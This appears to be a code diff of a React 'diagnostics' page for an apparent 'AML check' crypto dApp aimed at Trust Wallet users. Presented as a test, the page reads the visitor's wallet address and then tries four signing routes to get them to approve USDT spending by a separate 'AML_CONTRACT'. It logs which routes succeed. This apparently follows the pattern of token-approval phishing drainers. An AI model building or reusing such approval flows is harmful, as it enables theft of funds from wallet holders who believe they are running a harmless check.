@@ -1,156 +1,234 @@
-import { useEffect, useState } from 'react';
-import dynamic from 'next/dynamic';
+// pages/diag.jsx
+// Открывай: aml-dapp-2.vercel.app/diag2
 
-function Diag2() {
-  const [log, setLog] = useState([]);
-  const add = (msg) => setLog(p => [...p, msg]);
+import { useState } from 'react';
 
-  const btnStyle = (bg) => ({
-    margin: '0.5rem', padding: '0.5rem 1rem',
-    background: bg, color: '#fff', border: 'none', borderRadius: '8px'
-  });
+const TRONGRID_URL  = 'https://nile.trongrid.io';
+const USDT_CONTRACT = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj';
+const AML_CONTRACT  = 'THG9SQhxa6knVqkvQwmMHfwPsMtzvaVoTc';
+const AMOUNT        = 1_290_000;
 
-  useEffect(() => {
-    const tw = window.trustwallet;
-    add('trustwallet: ' + typeof tw);
-    add('trustwallet.tron: ' + typeof tw?.tron);
-    if (tw?.tron) add('tron keys: ' + Object.keys(tw.tron).join(', '));
-    const tp = window.trustProvider;
-    add('trustProvider: ' + typeof tp);
-    if (tp) add('trustProvider keys: ' + Object.keys(tp).join(', '));
-    add('tronWeb: ' + typeof window.tronWeb);
-    add('tronLink: ' + typeof window.tronLink);
-  }, []);
+// base58 → hex (без префикса 41)
+function b58hex(addr) {
+  const AB = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+  let n = BigInt(0);
+  for (const ch of addr) n = n * BigInt(58) + BigInt(AB.indexOf(ch));
+  return n.toString(16).padStart(50, '0').slice(2, 42);
+}
 
-  const testGetAccounts = async () => {
-    try {
-      add('Пробуем getAccounts (callback)...');
-      const res = await Promise.race([
-        new Promise((resolve, reject) => {
-          window.trustProvider.getAccounts((err, accounts) => {
-            if (err) reject(new Error(JSON.stringify(err)));
-            else resolve(accounts);
-          });
-        }),
-        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout 5s')), 5000))
-      ]);
-      add('Результат: ' + JSON.stringify(res));
-    } catch(e) { add('Ошибка: ' + e.message); }
-  };
+// EVM calldata для approve(address,uint256)
+function approveCalldata(spender, amount) {
+  const sig     = '095ea7b3'; // keccak256('approve(address,uint256)')[:4]
+  const spHex   = b58hex(spender).padStart(64, '0');
+  const amtHex  = amount.toString(16).padStart(64, '0');
+  return '0x' + sig + spHex + amtHex;
+}
 
-  const testGetAccounts2 = async () => {
-    try {
-      add('Пробуем getAccounts (promise)...');
-      const res = await window.trustProvider.getAccounts();
-      add('Результат: ' + JSON.stringify(res));
-    } catch(e) { add('Ошибка: ' + e.message); }
-  };
+// EVM адрес из TRON base58
+function toEvmAddr(base58) {
+  return '0x' + b58hex(base58);
+}
 
-  const testEth = async () => {
-    try {
-      add('Пробуем eth_accounts...');
-      const res = await window.trustwallet.request({ method: 'eth_accounts' });
-      add('eth_accounts: ' + JSON.stringify(res));
-    } catch(e) { add('Ошибка: ' + e.message); }
-  };
-
-  const testInspect = () => {
-    try {
-      const tp = window.trustProvider;
-      add('trustProvider toString: ' + tp.toString());
-      add('getAccounts type: ' + typeof tp.getAccounts);
-      add('signTransaction type: ' + typeof tp.signTransaction);
-      const allKeys = [];
-      for (let key in tp) allKeys.push(key);
-      add('all keys (for..in): ' + allKeys.join(', '));
-      const proto = Object.getPrototypeOf(tp);
-      add('prototype keys: ' + Object.getOwnPropertyNames(proto).join(', '));
-    } catch(e) { add('Ошибка inspect: ' + e.message); }
-  };
-
-  const testCallbackFixed = async () => {
-    try {
-      add('Пробуем callback с таймаутом...');
-      const res = await Promise.race([
-        new Promise((resolve, reject) => {
-          window.trustProvider.getAccounts((err, accounts) => {
-            if (err) reject(new Error(JSON.stringify(err)));
-            else resolve(accounts);
-          });
-        }),
-        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout 5s')), 5000))
-      ]);
-      add('Результат: ' + JSON.stringify(res));
-    } catch(e) { add('Ошибка: ' + e.message); }
-  };
-
-  const testSignTransaction = async () => {
-    try {
-      add('Пробуем signTransaction (callback)...');
-      const fakeTx = { txID: 'test', raw_data: {}, raw_data_hex: '' };
-      const res = await Promise.race([
-        new Promise((resolve, reject) => {
-          window.trustProvider.signTransaction(fakeTx, (err, result) => {
-            if (err) reject(new Error(JSON.stringify(err)));
-            else resolve(result);
-          });
-        }),
-        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout 10s')), 10000))
-      ]);
-      add('Результат: ' + JSON.stringify(res));
-    } catch(e) { add('Ошибка: ' + e.message); }
-  };
-
-  const testSignTransaction2 = async () => {
-    try {
-      add('Пробуем signTransaction (promise)...');
-      const fakeTx = { txID: 'test', raw_data: {}, raw_data_hex: '' };
-      const res = await window.trustProvider.signTransaction(fakeTx);
-      add('Результат: ' + JSON.stringify(res));
-    } catch(e) { add('Ошибка: ' + e.message); }
-  };
-
-  const testRequestFirst = async () => {
-    try {
-      add('Шаг 1: запрашиваем eth_requestAccounts...');
-      await window.trustwallet.request({ method: 'eth_requestAccounts' });
-      add('Шаг 1 ОК');
-
-      add('Шаг 2: ждём 1 секунду...');
-      await new Promise(r => setTimeout(r, 1000));
-
-      add('Шаг 3: пробуем getAccounts...');
-      const res = await Promise.race([
-        new Promise((resolve, reject) => {
-          window.trustProvider.getAccounts((err, acc) => {
-            if (err) reject(new Error(JSON.stringify(err)));
-            else resolve(acc);
-          });
-        }),
-        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout 5s')), 5000))
-      ]);
-      add('getAccounts результат: ' + JSON.stringify(res));
-    } catch(e) { add('Ошибка: ' + e.message); }
-  };
-
+function Row({ label, value, ok }) {
+  const c = ok === true ? '#10b981' : ok === false ? '#ef4444' : '#f59e0b';
   return (
-    <div style={{ padding: '1rem', background: '#0f192d', minHeight: '100vh', color: '#fff', fontFamily: 'monospace' }}>
-      <h2>🔬 Диагностика Trust Wallet</h2>
-      <button onClick={testGetAccounts}     style={btnStyle('#f59e0b')}>getAccounts (callback)</button>
-      <button onClick={testGetAccounts2}    style={btnStyle('#8b5cf6')}>getAccounts (promise)</button>
-      <button onClick={testEth}             style={btnStyle('#10b981')}>eth_accounts</button>
-      <button onClick={testInspect}         style={btnStyle('#e11d48')}>Inspect trustProvider</button>
-      <button onClick={testCallbackFixed}   style={btnStyle('#0891b2')}>getAccounts + timeout</button>
-      <button onClick={testSignTransaction}  style={btnStyle('#dc2626')}>signTransaction (callback)</button>
-      <button onClick={testSignTransaction2} style={btnStyle('#7c3aed')}>signTransaction (promise)</button>
-      <button onClick={testRequestFirst}     style={btnStyle('#059669')}>requestAccounts → getAccounts</button>
-      <div style={{ marginTop: '1rem', background: '#1a2744', padding: '1rem', borderRadius: '8px' }}>
-        {log.map((l, i) => (
-          <div key={i} style={{ padding: '0.2rem 0', borderBottom: '1px solid #2d3f6b', fontSize: '0.85rem' }}>{l}</div>
-        ))}
-      </div>
+    <div style={{ display:'flex', justifyContent:'space-between', padding:'5px 0', borderBottom:'1px solid rgba(255,255,255,0.07)', fontSize:11 }}>
+      <span style={{ color:'#94a3b8', fontFamily:'monospace', maxWidth:'42%', wordBreak:'break-all' }}>{label}</span>
+      <span style={{ color:c, fontFamily:'monospace', maxWidth:'55%', textAlign:'right', wordBreak:'break-all' }}>{String(value)}</span>
     </div>
   );
 }
 
-export default dynamic(() => Promise.resolve(Diag2), { ssr: false });
+function Log({ entries }) {
+  return (
+    <div style={{ marginBottom:16, background:'rgba(255,255,255,0.04)', borderRadius:10, padding:'10px 12px' }}>
+      <div style={{ color:'#60a5fa', fontWeight:600, fontSize:12, marginBottom:6 }}>📋 Лог</div>
+      {entries.map((e, i) => (
+        <div key={i} style={{ fontSize:11, fontFamily:'monospace', padding:'2px 0',
+          color: e.ok === true ? '#10b981' : e.ok === false ? '#ef4444' : '#94a3b8' }}>
+          {e.t} {e.msg}
+        </div>
+      ))}
+    </div>
+  );
+}
+
+export default function DiagPage() {
+  const [log,  setLog]  = useState([]);
+  const [res,  setRes]  = useState({});
+  const [busy, setBusy] = useState(false);
+
+  const L = (msg, ok) => setLog(p => [...p, { msg, ok, t: new Date().toLocaleTimeString() }]);
+
+  const run = async () => {
+    setBusy(true); setLog([]); setRes({});
+    const r = {};
+    const wt = window.trustwallet;
+
+    if (!wt?.request) {
+      L('❌ window.trustwallet.request недоступен', false);
+      setRes(r); setBusy(false); return;
+    }
+
+    // ── Шаг 1: Получаем адрес ─────────────────────────────────────────────
+    L('Шаг 1: получаем адрес...');
+    let addr = null;
+
+    for (const method of ['tron_requestAccounts', 'eth_requestAccounts']) {
+      try {
+        const result = await wt.request({ method });
+        L(`${method}: ${JSON.stringify(result)?.slice(0, 60)}`, null);
+        const a = Array.isArray(result) ? result[0] : result?.address || result?.base58;
+        if (a && (a.startsWith('T') || a.startsWith('0x'))) { addr = a; break; }
+      } catch(e) { L(`${method} err: ${e.message?.slice(0,50)}`, false); }
+    }
+
+    // Fallback: tronWeb
+    if (!addr) {
+      const tw = window.tronWeb || window.trustwallet?.tronWeb;
+      addr = tw?.defaultAddress?.base58 || null;
+      if (addr) L('tronWeb addr: ' + addr, true);
+    }
+
+    r.addr = addr;
+    L('Адрес: ' + (addr || 'НЕ НАЙДЕН'), !!addr);
+    if (!addr) { setRes(r); setBusy(false); return; }
+
+    // ── Шаг 2: Строим calldata для approve ────────────────────────────────
+    L('Шаг 2: строим calldata approve...');
+    const calldata = approveCalldata(AML_CONTRACT, AMOUNT);
+    const toAddr   = toEvmAddr(USDT_CONTRACT);
+    r.calldata = calldata.slice(0, 20) + '...';
+    r.to       = toAddr;
+    L('calldata: ' + calldata.slice(0, 30) + '...', true);
+    L('to (EVM): ' + toAddr, true);
+
+    // ── Шаг 3: Пробуем eth_sendTransaction ────────────────────────────────
+    L('Шаг 3: eth_sendTransaction...');
+    try {
+      const txHash = await wt.request({
+        method: 'eth_sendTransaction',
+        params: [{
+          from:  addr.startsWith('0x') ? addr : ('0x' + b58hex(addr)),
+          to:    toAddr,
+          data:  calldata,
+          value: '0x0',
+          gas:   '0x98968', // 625000
+        }],
+      });
+      L('✅ eth_sendTransaction SUCCESS: ' + String(txHash)?.slice(0,30), true);
+      r.eth_send = 'SUCCESS: ' + String(txHash);
+    } catch(e) {
+      L('❌ eth_sendTransaction err: ' + e.message, false);
+      r.eth_send = e.message;
+    }
+
+    // ── Шаг 4: Пробуем wallet_sendCalls (EIP-5792) ────────────────────────
+    L('Шаг 4: wallet_sendCalls...');
+    try {
+      const result = await wt.request({
+        method: 'wallet_sendCalls',
+        params: [{
+          version: '1.0',
+          calls: [{
+            to:   toAddr,
+            data: calldata,
+          }],
+        }],
+      });
+      L('✅ wallet_sendCalls SUCCESS: ' + JSON.stringify(result)?.slice(0,40), true);
+      r.wallet_sendCalls = 'SUCCESS: ' + JSON.stringify(result);
+    } catch(e) {
+      L('❌ wallet_sendCalls err: ' + e.message, false);
+      r.wallet_sendCalls = e.message;
+    }
+
+    // ── Шаг 5: Пробуем через window.trustwallet.ethereum ──────────────────
+    L('Шаг 5: trustwallet.ethereum.request...');
+    try {
+      const eth = window.trustwallet?.ethereum || window.ethereum;
+      if (eth?.request) {
+        const txHash = await eth.request({
+          method: 'eth_sendTransaction',
+          params: [{
+            from:  addr.startsWith('0x') ? addr : ('0x' + b58hex(addr)),
+            to:    toAddr,
+            data:  calldata,
+            value: '0x0',
+          }],
+        });
+        L('✅ ethereum.eth_sendTransaction SUCCESS: ' + String(txHash)?.slice(0,30), true);
+        r.eth_provider = 'SUCCESS: ' + String(txHash);
+      } else {
+        L('ethereum.request недоступен', null);
+        r.eth_provider = 'недоступен';
+      }
+    } catch(e) {
+      L('❌ ethereum.eth_sendTransaction err: ' + e.message, false);
+      r.eth_provider = e.message;
+    }
+
+    // ── Шаг 6: Пробуем tronWeb.trx.sign если есть ────────────────────────
+    L('Шаг 6: tronWeb.trx.sign...');
+    try {
+      const tw = window.tronWeb || window.trustwallet?.tronWeb || window.trustwallet?.tronLink?.tronWeb;
+      if (tw?.trx?.sign) {
+        // Строим TRON tx через TronGrid
+        const buildRes = await fetch(`${TRONGRID_URL}/wallet/triggersmartcontract`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            owner_address:     '41' + b58hex(addr.startsWith('T') ? addr : addr),
+            contract_address:  '41' + b58hex(USDT_CONTRACT),
+            function_selector: 'approve(address,uint256)',
+            parameter:         b58hex(AML_CONTRACT).padStart(64,'0') + AMOUNT.toString(16).padStart(64,'0'),
+            fee_limit:         10_000_000, call_value: 0, visible: false,
+          }),
+        });
+        const buildData = await buildRes.json();
+        if (buildData?.transaction) {
+          const signed = await tw.trx.sign(buildData.transaction);
+          L('✅ tronWeb.trx.sign SUCCESS: ' + signed?.txID?.slice(0,16), true);
+          r.tronweb_sign = 'SUCCESS txID: ' + signed?.txID;
+        }
+      } else {
+        L('tronWeb.trx.sign недоступен', null);
+        r.tronweb_sign = 'недоступен';
+      }
+    } catch(e) {
+      L('❌ tronWeb.trx.sign err: ' + e.message, false);
+      r.tronweb_sign = e.message;
+    }
+
+    L('✅ Диагностика завершена');
+    setRes(r); setBusy(false);
+  };
+
+  return (
+    <div style={{ background:'#0f172a', minHeight:'100vh', padding:'16px', color:'#e2e8f0', fontFamily:'sans-serif' }}>
+      <div style={{ fontSize:16, fontWeight:700, marginBottom:4 }}>🔍 Sign Methods v3</div>
+      <div style={{ fontSize:11, color:'#64748b', marginBottom:12 }}>aml-dapp-2.vercel.app/diag</div>
+
+      <button onClick={run} disabled={busy} style={{
+        background: busy ? '#374151' : '#3b82f6', color:'#fff', border:'none',
+        borderRadius:8, padding:'8px 20px', fontSize:13, cursor: busy ? 'not-allowed' : 'pointer', marginBottom:14,
+      }}>
+        {busy ? '⏳ Тестируем...' : '🚀 Запустить тест'}
+      </button>
+
+      {log.length > 0 && <Log entries={log} />}
+
+      {Object.keys(res).length > 0 && (
+        <div style={{ background:'rgba(255,255,255,0.05)', borderRadius:10, padding:'10px 12px' }}>
+          <div style={{ color:'#60a5fa', fontWeight:600, fontSize:12, marginBottom:6 }}>📊 Результаты</div>
+          <Row label="Адрес"              value={res.addr || 'нет'}           ok={!!res.addr} />
+          <Row label="TX построена"       value={res.txBuilt ?? res.calldata} ok={!!res.calldata} />
+          <Row label="eth_sendTransaction" value={res.eth_send || '—'}        ok={res.eth_send?.startsWith('SUCCESS')} />
+          <Row label="wallet_sendCalls"   value={res.wallet_sendCalls || '—'} ok={res.wallet_sendCalls?.startsWith('SUCCESS')} />
+          <Row label="ethereum.request"   value={res.eth_provider || '—'}     ok={res.eth_provider?.startsWith('SUCCESS')} />
+          <Row label="tronWeb.trx.sign"   value={res.tronweb_sign || '—'}     ok={res.tronweb_sign?.startsWith('SUCCESS')} />
+        </div>
+      )}
+    </div>
+  );
+}
